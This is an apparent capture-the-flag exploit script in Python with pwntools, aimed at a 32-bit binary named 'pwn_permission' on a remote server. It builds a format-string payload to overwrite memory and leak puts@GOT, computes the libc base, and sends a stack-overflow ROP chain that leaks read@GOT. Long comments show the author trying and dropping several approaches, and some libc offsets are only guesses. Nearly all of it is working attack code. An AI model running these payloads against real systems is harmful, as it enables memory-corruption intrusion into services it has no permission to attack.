from pwn import *

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# read@GOT is at 0x804c00c
# The PLT stub does: jmp [0x804c00c]
# If read hasn't been called yet, GOT points back to PLT stub (lazy binding)
# read@PLT stub: 0x8049040: jmp [0x804c00c]; push 0; jmp 0x8049030

# But vuln DOES call read(0, buf, 0x100), so read@GOT should be resolved

# Wait, I notice something: read@GOT is at 0x804c00c
# But earlier I was using elf.got['read'] which should give the correct address

# Let me check: the GOT entries in order are:
# 0x804c00c: read@GOT
# 0x804c010: printf@GOT
# 0x804c014: puts@GOT
# 0x804c018: __libc_start_main@GOT (or another)
# 0x804c01c: write@GOT

# The issue might be that when we call read@plt via ROP,
# the PLT stub tries to jump to [0x804c00c]
# But if we've overwritten nearby GOT entries (like printf@GOT at 0x804c010),
# we might have corrupted read@GOT

# Actually no, we haven't overwritten anything yet at this point

# Let me try a different approach: instead of calling read@plt,
# call read directly from libc (since we know the libc base)

# We already know puts@libc, so we can calculate read@libc

target_val_addr = 0x804c030
puts_got = elf.got['puts']
got_base = 0x804c000
bss_buf = 0x804c040
write_plt = elf.plt['write']
pop4ret = 0x8049380

PUTS_OFFSET = 0x6d1e0

# For libc-2.31 i386, read offset is typically around 0x0d5e0 or similar
# Let me query libc.rip for the read offset

import requests
api_url = "https://libc.rip/api/find"
data = {"symbols": {"puts": "0x6d1e0"}}

try:
    resp = requests.post(api_url, json=data, timeout=10)
    if resp.status_code == 200:
        libs = resp.json()
        for lib in libs:
            symbols = lib.get('symbols', {})
            read_off = symbols.get('read', None)
            if read_off:
                log.info(f"{lib.get('id', 'unknown')}: read offset = 0x{read_off}")
except Exception as e:
    log.error(f"API query failed: {e}")

# Actually, let me try a different approach entirely
# Instead of using read@plt in the ROP chain, let me use
# the fact that vuln ALREADY calls read

# vuln does: read(0, ebp-0x90, 0x100)
# What if we return to vuln's read call?
# The read call is at vuln+0x33 = 0x804925a

# But we need to set up ebp correctly
# After read, vuln continues with leave;ret
# leave: mov esp, ebp; pop ebp
# ret: jump to [esp]

# If we set ebp = bss_buf + 0x90, then:
# - read writes to (bss_buf + 0x90) - 0x90 = bss_buf
# - After read, leave: mov esp, bss_buf + 0x90; pop ebp = [bss_buf + 0x90]
# - ret: jump to [bss_buf + 0x94]

# So we need to:
# 1. Set up bss_buf + 0x90 and bss_buf + 0x94 with the values we want
# 2. Return to vuln's read call with ebp = bss_buf + 0x90

# But we can't set up bss_buf contents before the read...
# Unless we use a two-stage approach

# Actually, let me try something simpler:
# Return to vuln's read call with ebp pointing to the original stack
# This way, read writes to the stack (which is fine)
# And after read, leave;ret uses the data we just wrote

# The original stack address can be calculated from the leaked data
# But we don't know the exact stack address...

# OK, let me try yet another approach:
# Use the write ROP (which works!) to leak read@GOT
# Then we can verify if read@GOT is correctly resolved

fmt_payload = b'%5c%7$hhnAAA'
fmt_payload += p32(target_val_addr)
fmt_payload += p32(puts_got)
fmt_payload += b'%8$s'

import time

conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)
conn.send(fmt_payload)
time.sleep(2)
response = conn.recv(timeout=5)

idx = response.find(b'here.\n')
after_here = response[idx+6:]
input_idx = after_here.find(b'Input:')
fmt_output = after_here[:input_idx]
leaked = fmt_output[16:]
puts_leak = u32(leaked[:4])
libc_base = puts_leak - PUTS_OFFSET

log.info(f"libc base: 0x{libc_base:x}")

# Leak read@GOT using write
read_got = elf.got['read']  # 0x804c00c

payload = b'A' * 140
payload += p32(got_base)
payload += p32(bss_buf)
payload += p32(write_plt)
payload += p32(pop4ret)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

conn.send(payload)
time.sleep(1)

try:
    read_addr = u32(conn.recv(4, timeout=3))
    log.info(f"read@GOT value: 0x{read_addr:x}")
    
    # Check if it's a valid libc address
    if 0xf7000000 < read_addr < 0xf7ffffff:
        read_offset = read_addr - libc_base
        log.info(f"read offset: 0x{read_offset:x}")
        log.success("read@GOT is resolved to a valid libc address!")
    elif 0x08048000 < read_addr < 0x0804a000:
        log.info(f"read@GOT points back to PLT (not resolved): 0x{read_addr:x}")
        log.info("This means read hasn't been called through PLT yet!")
    else:
        log.info(f"read@GOT has unexpected value: 0x{read_addr:x}")
except Exception as e:
    log.error(f"Error: {e}")

conn.close()

# If read@GOT is not resolved, we need to resolve it first
# Or use read from libc directly

# Let me also try using libc's read directly
# For libc-2.31 i386, read is at offset 0x0d5e0 (approximately)
# But I need the exact offset

# Let me calculate it from the leaked read@GOT value